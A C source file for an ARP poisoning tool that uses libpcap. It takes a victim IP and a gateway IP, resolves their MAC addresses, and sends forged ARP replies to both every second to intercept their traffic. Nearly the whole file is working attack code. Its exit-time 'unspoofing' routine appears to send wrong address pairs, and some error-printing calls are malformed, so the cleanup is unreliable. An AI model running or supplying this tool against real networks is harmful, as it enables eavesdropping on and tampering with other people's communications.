#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#include <netinet/if_ether.h>

#include <time.h>
#include <errno.h>
#include <signal.h>

#include "../include/hehlib.h"

/* declar variables for mac addresses */
unsigned char attacker_mac[MAC_SIZE]; 
unsigned char gateway_mac[MAC_SIZE];
unsigned char victim_mac[MAC_SIZE];

/* declar variables for ip addresses */
unsigned char attacker_ip[IP_SIZE];
unsigned char gateway_ip[IP_SIZE];
unsigned char victim_ip[IP_SIZE];

u_char arp_unspoof[ETHER_SIZE + ARP_SIZE];
pcap_t *handle;

void unspoofing(int signum)
{
	printf("--Unspoofing devices--");

	for(int i = 0; i < 4; i++)
	{
            /* unspoof devices */
            make_arp_packet(arp_unspoof, victim_mac, attacker_mac, attacker_ip, victim_ip, victim_mac, ARP_REPLY);

            if (pcap_sendpacket(handle, arp_unspoof,ETHER_SIZE + ARP_SIZE) != 0) {
                fprintf(stderr, "Error: ", pcap_geterr(handle));
	    }

            make_arp_packet(arp_unspoof, gateway_mac, attacker_mac, attacker_ip, gateway_ip, gateway_mac, ARP_REPLY);

            if (pcap_sendpacket(handle, arp_unspoof,ETHER_SIZE + ARP_SIZE) != 0) {
                fprintf(stderr, "Error: ", pcap_geterr(handle));
	    }

	    sleep(1);
       }

       exit(0);
}

void remove_newline(char* string)
{
	if(strlen(string) == 0)
	{
		return;
	}

	else if(strlen(string) == 1 && string[0] == '\n')
	{
		return;
	}

	else if(string[strlen(string) - 1] == '\n')
	{
		string[strlen(string) - 1] = '\0';
	}
}
	
int main(int argc, char **argv)
{
	pcap_if_t *devices;
        char error_buffer[PCAP_ERRBUF_SIZE];
	
	/* pcap_findalldevs search for internet interfaces on network */
	int status  = pcap_findalldevs(&devices, error_buffer);
	const u_char *packet;
	struct pcap_pkthdr* packet_header;

        bpf_u_int32 ip_address_of_device;
	bpf_u_int32 netmask_device;
		
	char device_name[80]; 
	printf("On what device you want to capture: ");
	fgets(device_name, 80, stdin);
	remove_newline(device_name);

	char victim_ip_str[20];
	printf("Type victim ip: ");
	fgets(victim_ip_str, 20, stdin);
	remove_newline(victim_ip_str);

	char gateway_ip_str[20];
	printf("Type gateway ip: ");
	fgets(gateway_ip_str, 20, stdin);
	remove_newline(gateway_ip_str);

	/* get ip address and subnet mask */
	get_ip_interface(devices, device_name, &ip_address_of_device, &netmask_device);
	handle = pcap_open_live(device_name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, error_buffer);

        if (handle == NULL) {
             fprintf(stderr, "%s: %s\n", device_name, error_buffer);
             return 1;
        }
 
        pcap_freealldevs(devices);

	/* convert ip addresses in string to number format */
	in_addr_t victim_ip_32 = inet_addr(victim_ip_str);
	in_addr_t gateway_ip32 = inet_addr(gateway_ip_str);
	
	if(victim_ip_32 == -1 || gateway_ip32 == -1)
	{
		fprintf(stderr, "Bad format of ip address\n");
		exit(1);
	}

	/* change variable types to unsigned char* */
        memcpy(victim_ip, &victim_ip_32, IP_SIZE);
        memcpy(attacker_ip, &ip_address_of_device, IP_SIZE);        
	memcpy(gateway_ip, &gateway_ip32, IP_SIZE);

	/* get mac addresess of attackers, gateway and victim */
	get_mac_interface(device_name, attacker_mac);
	get_mac_target(handle, victim_mac, attacker_mac, victim_ip, attacker_ip, netmask_device, victim_ip_str);
	get_mac_target(handle, gateway_mac, attacker_mac, gateway_ip, attacker_ip, netmask_device, gateway_ip_str);

	u_char arp_send[ETHER_SIZE + ARP_SIZE];
        printf("--Starting arp poisoning--\n");

	signal(SIGHUP, unspoofing);
	signal(SIGTERM, unspoofing);
	signal(SIGINT, unspoofing);

        while (true) {	       
           /* send false arp reply to victim */
	   make_arp_packet(arp_send, victim_mac, attacker_mac, gateway_ip, victim_ip, victim_mac, ARP_REPLY);

	   if (pcap_sendpacket(handle, arp_send ,ETHER_SIZE + ARP_SIZE) != 0) {
                fprintf(stderr, "Error: ", pcap_geterr(handle));
	   }

	   /* send false arp reply to gateway */
	   make_arp_packet(arp_send, gateway_mac, attacker_mac, victim_ip, gateway_ip, gateway_mac, ARP_REPLY);   

	   if (pcap_sendpacket(handle, arp_send,ETHER_SIZE + ARP_SIZE) != 0) {
		   fprintf(stderr, "Error: ", pcap_geterr(handle));
           }

	   sleep(1);
        }

       return 0;
}

